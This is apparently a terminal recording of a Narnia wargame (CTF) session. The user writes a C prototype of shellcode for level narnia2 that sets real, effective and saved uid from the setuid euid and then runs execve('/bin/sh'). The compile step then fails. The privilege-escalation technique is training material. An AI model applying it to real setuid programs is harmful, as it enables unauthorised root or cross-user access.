[15.521, "o", "$ cat /tmp/l2_proto.c\r\nvim -u NONE -N /tmp/l2_proto.c\r\r\n\u001b[?2004l\r\u001b]3008;start=10b7a591-c408-4dbf-8f9f-9b358def495f;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\\u001b[?1049h\u001b[22;0;0t\u001b[>4;2m\u001b[?1h\u001b=\u001b[?2004h\u001b[?1004h\u001b[1;32r\u001b[?12h\u001b[?12l\u001b[22;2t\u001b[22;1t\u001b[27m\u001b[23m\u001b[29m\u001b[m\u001b[H\u001b[2J\u001b[?25l\u001b[32;1H\"/tmp/l2_proto.c\" [New]\u001b[2;1H▽\u001b[6n\u001b[2;1H  \u001b[3;1H\u001bPzz\u001b\\\u001b[0%m\u001b[6n\u001b[3;1H           \u001b[1;1H\u001b[>c\u001b]10;?\u0007\u001b]11;?\u0007\u001b[2;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[3;1H~                                                                                                   \u001b[4;1H~                                                                                                   \u001b[5;1H~                                                                                                   \u001b[6;1H~                                                                                                   \u001b[7;1H~                                                                                                   \u001b[8;1H~                                                                                                   \u001b[9;1H~                                                                                                   \u001b[10;1H~                                                                                                   \u001b[11;1H~                                                                                                   \u001b[12;1H~                                                                                                   \u001b[13;1H~                                                                                                   \u001b[14;1H~                                                                                                   \u001b[15;1H~                                                                                                   \u001b[16;1H~                                                                                                   \u001b[17;1H~                                                                                                   \u001b[18;1H~                                                                                                   \u001b[19;1H~                                                                                                   \u001b[20;1H~                                                                                                   \u001b[21;1H~                                                                                                   \u001b[22;1H~                                                                                                   \u001b[23;1H~                                                                                                   \u001b[24;1H~                                                                                                   \u001b[25;1H~                                                                                                   \u001b[26;1H~                                                                                                   \u001b[27;1H~                                                                                                   \u001b[28;1H~                                                                                                   \u001b[29;1H~                                                                                                   \u001b[30;1H~                                                                                                   \u001b[31;1H~                                                                                                   \u001b[m\u001b[32;83H0,0-1\u001b[9CAll\u001b[1;1H\u001b[?25h\u001b[?4m\u001b[?25l\u001b[32;73Hi\u001b[1;1H\u001b[32;73H \u001b[1;1H\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;13H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1H\u001b[?25h\u001b[?25l/* l2_proto.c -- a C prototype of the shellcode we are about to write in asm.\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25l *\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l * The plan for narnia2 is to inject machine code into argv[1]. Before writing\u001b[4;1H\u001b[K\u001b"]
[0.000, "o", "[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l * a single assembly instruction it helps to express the same logic in C and\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25l * check that it does what we think:\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25l *\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25l *   1. write(1, \"PWN!\", 4);\u001b[8C-- a marker so the address sweep can see a hit\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25l *   2. euid = geteuid();\u001b[11C-- the binary is setuid narnia3, so euid is narnia3\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25l *   3. setreuid(euid, euid);\u001b[7C-- make the real uid match the effective uid\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25l *   4. setuid(euid);\u001b[15C-- set real, effective AND saved uid, so the\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25l *\u001b[34C--   privilege survives execve (plain setreuid\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25l *\u001b[34C--   leaves the saved uid at narnia2 and the\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25l *\u001b[34C--   shell would drop back to narnia2)\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25l *   5. execve(\"/bin/sh\", argv, NULL);\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25l *\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[?25l * Compile and run:   gcc -m32 -o l2_proto l2_proto.c && ./l2_proto\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25l * (when run from the narnia2 account, euid is narnia2, so this proves the\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25l *  syscall sequence works but not the privilege gain -- that needs the setuid\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25l *  binary itself.)\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25l */\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25l#include <stdio.h>\u001b[22;1H\u001b[K\u001b[32;84H2\u001b[22;1H\u001b[?25h\u001b[?25l#include <unistd.h>\u001b[23;1H\u001b[K\u001b[32;84H3\u001b[23;1H\u001b[?25h\u001b[?25l\u001b[24;1H\u001b[K\u001b[32;84H4\u001b[24;1H\u001b[?25h\u001b[?25lint main(void)\u001b[25;1H\u001b[K\u001b[32;84H5\u001b[25;1H\u001b[?25h\u001b[?25l{\u001b[26;1H\u001b[K\u001b[32;84H6\u001b[26;1H\u001b[?25h\u001b[?25l    char *argv[] = { \"/bin/sh\", NULL };\u001b[27;1H\u001b[K\u001b[32;84H7\u001b[27;1H\u001b[?25h\u001b[?25l\u001b[28;1H\u001b[K\u001b[32;84H8\u001b[28;1H\u001b[?25h\u001b[?25l    write(1, \"PWN!\", 4);\u001b[10C/* marker */\u001b[29;1H\u001b[K\u001b[32;84H9\u001b[29;1H\u001b[?25h\u001b[?25l    write(1, \"\\n\", 1);\u001b[30;1H\u001b[K\u001b[32;83H30\u001b[30;1H\u001b[?25h\u001b[?25l\u001b[31;1H\u001b[K\u001b[32;84H1\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Huid_t euid = geteuid();\u001b[7C/* narnia3 when run through the setuid binary */\u001b[32;83H\u001b[K\u001b[32;83H32,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hprintf(\"euid = %d\\n\", (int)euid);\u001b[32;83H\u001b[K\u001b[32;83H33,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H34,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hsetreuid(euid, euid);\u001b[9C/* real = effective */\u001b[32;83H\u001b[K\u001b[32;83H35,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hsetuid(euid);\u001b[17C/* real = effective = saved */\u001b[32;83H\u001b[K\u001b[32;83H36,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[32;83H\u001b[K\u001b[32;83H37,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hexecve(\"/bin/sh\", argv, NULL);\u001b[32;83H\u001b[K\u001b[32;83H38,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hperror(\"execve\");\u001b[32;83H\u001b[K\u001b[32;83H39,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;5Hreturn 1;\u001b[32;83H\u001b[K\u001b[32;83H40,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[32;1H\u001b[K\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1H}\u001b[32;83H41,0-1\u001b[8CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[32;83H\u001b[K\u001b[32;1H:wq\r\u001b[?2004l\u001b[>4;m\"/tmp/l2_proto.c\" [New] 41L, 1625B written\r\u001b[23;2t\u001b[23;1t\r\r\r\n\u001b[?1004l\u001b[?2004l\u001b[?1l\u001b>\u001b[?1049l\u001b[23;0;0t\u001b[?25h\u001b[>4;m\u001b]3008;end=10b7a591-c408-4dbf-8f9f-9b358def495f;exit=success\u001b\\\u001b]3008;start=fb767b35-ec89-450c-b9d7-21327b2c6b7a;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\\u001b[?2004h\u001b]0;narnia2@narnia: ~\u0007narnia2@narnia:~$ $ gcc -m32 -o /tmp/l2_proto /tmp/l2_proto.c\r\n"]
[0.523, "o", "cat /tmp/l2_proto.c\r\r\n\u001b[?2004l\r\u001b]3008;start=8ca644dd-8cc3-4d3e-978d-d1104fa722d0;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\"]
[0.004, "o", "/* l2_proto.c -- a C prototype of the shellcode we are about to write in asm.\r\r\n *\r\r\n * The plan for narnia2 is to inject machine code into argv[1]. Before writing\r\r\n * a single assembly instruction it helps to express the same logic in C and\r\r\n * check that it does what we think:\r\r\n *\r\r\n *   1. write(1, \"PWN!\", 4);        -- a marker so the address sweep can see a hit\r\r\n *   2. euid = geteuid();           -- the binary is setuid narnia3, so euid is narnia3\r\r\n *   3. setreuid(euid, euid);       -- make the real uid match the effective uid\r\r\n *   4. setuid(euid);               -- set real, effective AND saved uid, so the\r\r\n *                                  --   privilege survives execve (plain setreuid\r\r\n *                                  --   leaves the saved uid at narnia2 and the\r\r\n *                                  --   shell would drop back to narnia2)\r\r\n *   5. execve(\"/bin/sh\", argv, NULL);\r\r\n *\r\r\n * Compile and run:   gcc -m32 -o l2_proto l2_proto.c && ./l2_proto\r\r\n * (when run from the narnia2 account, euid is narnia2, so this proves the\r\r\n *  syscall sequence works but not the privilege gain -- that needs the setuid\r\r\n *  binary itself.)\r\r\n */\r\r\n#include <stdio.h>\r\r\n#include <unistd.h>\r\r\n\r\r\nint main(void)\r\r\n{\r\r\n    char *argv[] = { \"/bin/sh\", NULL };\r\r\n\r\r\n    write(1, \"PWN!\", 4);          /* marker */\r\r\n    write(1, \"\\n\", 1);\r\r\n\r\r\n    uid_t euid = geteuid();       /* narnia3 when run through the setuid binary */\r\r\n    printf(\"euid = %d\\n\", (int)euid);\r\r\n\r\r\n    setreuid(euid, euid);         /* real = effective */\r\r\n    setuid(euid);                 /* real = effective = saved */\r\r\n\r\r\n    execve(\"/bin/sh\", argv, NULL);\r\r\n    perror(\"execve\");\r\r\n    return 1;\r\r\n}\r\r\n\r\r\n"]
[0.033, "o", "\u001b]3008;end=8ca644dd-8cc3-4d3e-978d-d1104fa722d0;exit=success\u001b\\\u001b]3008;start=fb767b35-ec89-450c-b9d7-21327b2c6b7a;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\\u001b[?2004h\u001b]0;narnia2@narnia: ~\u0007narnia2@narnia:~$ gcc -m32 -o /tmp/l2_proto /tmp/l2_proto.c\r\r\n\u001b[?2004l\r\u001b]3008;start=db8a2655-d70a-4a24-a06d-6d71e8015ff1;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\Cannot create temporary file in ./: Permission denied\r\r\nAborted                    gcc -m32 -o /tmp/l2_proto /tmp/l2_proto.c\r\r\n"]
[0.159, "o", "\u001b]3008;end=db8a2655-d70a-4a24-a06d-6d71e8015ff1;exit=failure;status=134;signal=SIGABRT\u001b\\\u001b]3008;start=fb767b35-ec89-450c-b9d7-21327b2c6b7a;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\\u001b[?2004h\u001b]0;narnia2@narnia: ~\u0007narnia2@narnia:~$ $ file /tmp/l2_proto\r\n"]
[0.603, "o", "$ echo '$ run the prototype (stdin from /dev/null so the shell exits at once):'\r\n"]
